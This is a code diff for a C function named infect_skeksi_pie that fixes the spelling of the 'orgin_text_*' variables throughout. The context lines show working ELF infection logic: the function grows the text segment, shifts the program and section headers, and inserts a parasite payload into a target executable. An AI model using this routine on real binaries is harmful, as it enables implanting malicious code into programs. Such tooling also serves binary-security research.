@@ -280,9 +280,9 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
     uint64_t parasite_addr;
     size_t distance;
     uint64_t min_paddr = 0x0;
-    uint64_t orgin_text_vaddr = 0x0;
-    uint64_t orgin_text_offset = 0x0;
-    size_t orgin_text_size = 0x0;
+    uint64_t origin_text_vaddr = 0x0;
+    uint64_t origin_text_offset = 0x0;
+    size_t origin_text_size = 0x0;
 
     uint64_t vstart, vend;
     get_segment_range(elfname, PT_LOAD, &vstart, &vend);
@@ -322,9 +322,9 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                         if (phdr[j].p_vaddr < min_paddr)
                             min_paddr = phdr[j].p_vaddr;
                     }
-                    orgin_text_vaddr = phdr[i].p_vaddr;
-                    orgin_text_size = phdr[i].p_memsz;
-                    orgin_text_offset = phdr[i].p_offset;
+                    origin_text_vaddr = phdr[i].p_vaddr;
+                    origin_text_size = phdr[i].p_memsz;
+                    origin_text_offset = phdr[i].p_offset;
                     phdr[i].p_memsz += PAGE_SIZE;
                     phdr[i].p_vaddr -= PAGE_SIZE;
                     phdr[i].p_paddr -= PAGE_SIZE;
@@ -338,26 +338,26 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_phnum; i++) {
             if (i == text_index)
                 continue;
-            if (phdr[i].p_vaddr < orgin_text_vaddr) {
+            if (phdr[i].p_vaddr < origin_text_vaddr) {
                 phdr[i].p_vaddr += align_to_4k(vend);
                 phdr[i].p_paddr += align_to_4k(vend);
                 continue;
             }
 
-            // if (phdr[i].p_vaddr > orgin_text_vaddr) {
+            // if (phdr[i].p_vaddr > origin_text_vaddr) {
             //     phdr[i].p_vaddr += PAGE_SIZE;
             // }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
-            if (shdr[i].sh_addr == orgin_text_vaddr) {
+            if (shdr[i].sh_addr == origin_text_vaddr) {
                 shdr[i].sh_addr -= PAGE_SIZE;
                 shdr[i].sh_size += PAGE_SIZE;
             }
-            else if (shdr[i].sh_addr < orgin_text_vaddr) {
+            else if (shdr[i].sh_addr < origin_text_vaddr) {
                 shdr[i].sh_addr += align_to_4k(vend);
             }
-            // else if (shdr[i].sh_addr >= orgin_text_vaddr + orgin_text_size) {
+            // else if (shdr[i].sh_addr >= origin_text_vaddr + origin_text_size) {
             //     shdr[i].sh_addr += PAGE_SIZE;
             // }
         }
@@ -387,13 +387,13 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                 phdr[i].p_filesz += PAGE_SIZE;
                 continue;
             }
-            if (phdr[i].p_offset > orgin_text_offset) {
+            if (phdr[i].p_offset > origin_text_offset) {
                 phdr[i].p_offset += PAGE_SIZE;
             }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
-            if (shdr[i].sh_offset >= orgin_text_offset + orgin_text_size) {
+            if (shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
                 shdr[i].sh_offset += PAGE_SIZE;
             }
         }
@@ -420,9 +420,9 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                         if (phdr[j].p_vaddr < min_paddr)
                             min_paddr = phdr[j].p_vaddr;
                     }
-                    orgin_text_vaddr = phdr[i].p_vaddr;
-                    orgin_text_size = phdr[i].p_memsz;
-                    orgin_text_offset = phdr[i].p_offset;
+                    origin_text_vaddr = phdr[i].p_vaddr;
+                    origin_text_size = phdr[i].p_memsz;
+                    origin_text_offset = phdr[i].p_offset;
                     phdr[i].p_memsz += PAGE_SIZE;
                     phdr[i].p_vaddr -= PAGE_SIZE;
                     phdr[i].p_paddr -= PAGE_SIZE;
@@ -436,7 +436,7 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_phnum; i++) {
             if (i == text_index)
                 continue;
-            if (phdr[i].p_vaddr < orgin_text_vaddr) {
+            if (phdr[i].p_vaddr < origin_text_vaddr) {
                 phdr[i].p_vaddr += align_to_4k(vend);
                 phdr[i].p_paddr += align_to_4k(vend);
                 continue;
@@ -444,11 +444,11 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
-            if (shdr[i].sh_addr == orgin_text_vaddr) {
+            if (shdr[i].sh_addr == origin_text_vaddr) {
                 shdr[i].sh_addr -= PAGE_SIZE;
                 shdr[i].sh_size += PAGE_SIZE;
             }
-            else if (shdr[i].sh_addr < orgin_text_vaddr) {
+            else if (shdr[i].sh_addr < origin_text_vaddr) {
                 shdr[i].sh_addr += align_to_4k(vend);
             }
         }
@@ -478,13 +478,13 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                 phdr[i].p_filesz += PAGE_SIZE;
                 continue;
             }
-            if (phdr[i].p_offset > orgin_text_offset) {
+            if (phdr[i].p_offset > origin_text_offset) {
                 phdr[i].p_offset += PAGE_SIZE;
             }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
-            if (shdr[i].sh_offset >= orgin_text_offset + orgin_text_size) {
+            if (shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
                 shdr[i].sh_offset += PAGE_SIZE;
             }
         }
@@ -500,7 +500,7 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
     char *parasite_expand = malloc(PAGE_SIZE);
     memset(parasite_expand, 0, PAGE_SIZE);
     memcpy(parasite_expand, parasite, PAGE_SIZE - size > 0? size: PAGE_SIZE);
-    int ret = insert_data(elfname, orgin_text_offset, parasite_expand, PAGE_SIZE);
+    int ret = insert_data(elfname, origin_text_offset, parasite_expand, PAGE_SIZE);
     if (ret == 0) {
         VERBOSE("insert successfully\n");
     } else {
